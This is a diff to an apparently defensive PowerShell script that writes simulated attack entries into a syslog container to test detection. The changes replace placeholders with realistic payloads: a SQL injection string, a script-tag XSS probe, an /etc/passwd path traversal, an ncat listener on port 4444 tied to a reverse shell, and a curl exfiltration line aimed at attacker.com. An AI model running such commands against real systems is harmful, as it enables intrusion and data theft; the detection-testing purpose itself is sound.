@@ -49,17 +49,17 @@ switch ($option) {
     }
     "2" {
         Simulate-Attack "SQL Injection" {
-            docker exec syslog-client logger -t apache "GET /login.php?id=1 OR 1=1 HTTP/1.1 - SQL Injection attempt"
+            docker exec syslog-client logger -t apache "GET /login.php?id=1' OR '1'='1 HTTP/1.1 - SQL Injection attempt"
         }
     }
     "3" {
         Simulate-Attack "XSS Attack" {
-            docker exec syslog-client logger -t apache "GET /search?q=SCRIPT_ALERT_XSS HTTP/1.1 - XSS attempt"
+            docker exec syslog-client logger -t apache "GET /search?q=<script>alert('XSS')</script> HTTP/1.1 - XSS attempt"
         }
     }
     "4" {
         Simulate-Attack "Path Traversal" {
-            docker exec syslog-client logger -t apache "GET /files?path=../../etc/passwd HTTP/1.1 - Path traversal attempt"
+            docker exec syslog-client logger -t apache "GET /files?path=../../../etc/passwd HTTP/1.1 - Path traversal attempt"
         }
     }
     "5" {
@@ -81,13 +81,13 @@ switch ($option) {
     }
     "8" {
         Simulate-Attack "Proceso Sospechoso" {
-            docker exec syslog-client logger -t bash "Process started: nc -lvp 4444"
+            docker exec syslog-client logger -t bash "Process started: ncat -lvp 4444"
             docker exec syslog-client logger -t bash "Reverse shell connection established"
         }
     }
     "9" {
         Simulate-Attack "Exfiltracion de Datos" {
-            docker exec syslog-client logger -t bash "User executed: scp /etc/passwd attacker@external.com:/tmp/"
+            docker exec syslog-client logger -t bash "User executed: curl -X POST /etc/passwd attacker.com/exfil"
         }
     }
     "10" {
@@ -111,7 +111,7 @@ switch ($option) {
         }
         
         Simulate-Attack "3/10 - XSS Attack" {
-            docker exec syslog-client logger -t apache "GET /comment?text=SCRIPT_XSS_PAYLOAD HTTP/1.1"
+            docker exec syslog-client logger -t apache "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1"
         }
         
         Simulate-Attack "4/10 - Path Traversal" {
@@ -133,7 +133,7 @@ switch ($option) {
         }
         
         Simulate-Attack "8/10 - Proceso Sospechoso" {
-            docker exec syslog-client logger -t bash "Process started: nc -lvp 4444"
+            docker exec syslog-client logger -t bash "Process started: ncat -lvp 4444"
             docker exec syslog-client logger -t bash "Reverse shell connection established"
         }
         
